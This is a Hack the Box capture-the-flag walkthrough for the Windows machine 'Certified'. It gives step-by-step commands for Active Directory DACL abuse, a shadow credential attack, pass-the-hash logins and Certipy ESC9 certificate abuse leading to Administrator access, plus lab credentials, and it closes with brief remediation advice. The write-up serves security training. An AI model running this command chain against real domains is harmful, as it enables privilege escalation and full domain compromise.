# Certified

**Platform: Hack the Box**

**OS: Windows**

**Diffculty: Medium**


## Table of Contents
- [Key Learnings](#key-learnings)
- [Walkthrough](#walkthrough)
- [Remediation Summary](#remediation-summary)


## Key Learnings

- Familiarize myself with enumerating AD networks using Bloodhound
- Abuse Active Directory DACLs 
- Successfully execute a shadow credential attack via Pywhisker
- Enumerate vulnerable certificate templates and exploit a ESC9 template misconfiguration using Certipy


## **Disclaimer: Potential spoilers below**


## Walkthrough

1. Run nmap scan

![image](https://github.com/user-attachments/assets/3d450477-a74d-497b-b96d-dacf1a0f743d)

2. judith.mader has WriteOwner permissions on management group which has GenericWrite privs on management_svc account

![image](https://github.com/user-attachments/assets/9f75d80d-89af-40a5-9972-eb0ff164c551)

3. change owner of management group to judith

	```python3 bloodyAD.py --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 set owner "Management" judith.mader```

4. then give GenericAll privs to judith
	
	```python3 bloodyAD.py --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add genericAll Management judith.mader```

5. then add judith to the management group
	
	```python3 bloodyAD.py --host 10.129.231.186 -d certified.htb -u judith.mader -p judith09 add groupMember Management judith.mader```

![image](https://github.com/user-attachments/assets/83e0b353-2b33-456e-be7e-4c4f9fd180cf)

6. now can run shadow credential attack on management_svc

	```python3 pywhisker.py -d certified.htb -u judith.mader -p judith09 -t management_svc -a add --dc-ip 10.129.130.180```

![image](https://github.com/user-attachments/assets/445020c8-2150-461e-ba74-1bd4d5fdaf5b)

7. use PKINIT tools to get TGT for management_svc. Got a clock skew error so fix clock skew and then run again
	
	```python3 gettgtpkinit.py -cert-pfx PFX_FILE -pfx-pass PFX_PASS certified.htb/management_svc -dc-ip 10.129.130.180 ccache```

![image](https://github.com/user-attachments/assets/0931b573-328f-4fd0-a0c3-2e4d937da20c)

8. Export ccache to KRB5CCNAME env var and use AS-REP encryption key from getting TGT to get NT hash of management_svc account using PKINIT tools getnthash.py

	```python3 getnthash.py -key AS_REP_KEY -dc-ip 10.129.130.180 certified.htb/management_svc```

![image](https://github.com/user-attachments/assets/98efc969-2c11-4b5c-8890-777a40922f7d)

9. Can evil-winrm into machine using management_svc hash

	```evil-winrm -i 10.129.130.180 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584```

![image](https://github.com/user-attachments/assets/55e2e59e-2f73-4870-a387-3dfd2e37a651)

10. Bloodhound shows management_svc has GenericAll privs on user ca_operator. Change ca_operator password
	
 	```python3 /opt/bloodyAD/bloodyAD.py --dc-ip 10.129.131.108 -d certified.htb -u management_svc -p :a091c1832bcdd4677c28b5a6a1295584 set password ca_operator P@ssw0rd```
Success!

![image](https://github.com/user-attachments/assets/23415309-3f97-4fd2-9e6e-31b3feae8432)

11. Get list of certificate templates
	
	```certipy find -u ca_operator -p P@ssw0rd -dc-ip 10.129.131.108 -enabled```

![image](https://github.com/user-attachments/assets/2a9d2c0d-966e-4345-be32-68f88bfe1f85)

12. CertifiedAuthentication template has ESC9 vulnerability. To exploit ESC9 templates, set the upn of ca_operator to Administrator
	
 	```certipy account update -username management_svc -hashes :[NT_HASH] -upn Administrator -dc-ip [IP] -user ca_operator```

![image](https://github.com/user-attachments/assets/a41bf04c-24bb-4163-9ed7-a19f9d89980a)

13. Request certificate with changed upn
	
 	```certipy req -u ca_operator@certified.htb -p P@ssw0rd -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip [IP]```

![image](https://github.com/user-attachments/assets/ca644a51-0514-427b-9fcc-d164ff246b38)

14. Change back ca_operator upn to original
	
 	```certipy account update -username management_svc -hashes :[NT_HASH] -upn ca_operator -dc-ip [IP] -user ca_operator```

![image](https://github.com/user-attachments/assets/92e33eb1-c3ca-47be-b0dd-7a2146995aa2)

15. Authenticate with admin certificate and get NT hash of Administrator
	
 	```certipy auth -pfx administrator.pfx -domain certified.htb -dc-ip [IP]```

![image](https://github.com/user-attachments/assets/b1df9eeb-8584-433b-ad17-253920ba04ff)

16. Check administrator hash is correct using pass the hash
	
 	```crackmapexec smb [IP] -u Administrator -H [HASH]```

![image](https://github.com/user-attachments/assets/34eab86c-32f0-413b-8bf5-d00b62a6feea)

17. Pwned! Psexec into machine and get root flag!
	
 	```psexec.py Administrator@[IP] -hashes [HASH]```

![image](https://github.com/user-attachments/assets/c4549cc0-4fe6-427a-a6a7-cc077521e35d)


## Remediation Summary
- Always follow Principle of Least Privilege! Users should not have more rights than absolutely necessary.
- Use strong passwords, especially for service accounts like management_svc.
- Enforce objectSid validation on all certificates. This prevents users from requesting for certificates to impersonate other users.






 
